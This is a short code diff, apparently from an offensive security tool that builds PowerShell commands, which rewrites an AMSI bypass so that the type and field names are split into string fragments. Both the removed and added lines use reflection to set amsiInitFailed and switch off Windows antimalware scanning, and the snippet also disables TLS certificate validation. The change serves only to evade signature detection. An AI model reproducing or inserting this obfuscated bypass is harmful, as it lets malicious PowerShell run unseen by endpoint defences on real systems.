@@ -71,7 +71,7 @@ def create_ps_command(ps_command, force_ps32=False, dont_obfs=False):
 
     amsi_bypass = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 try{
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
+[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)
 }catch{}
 """
 
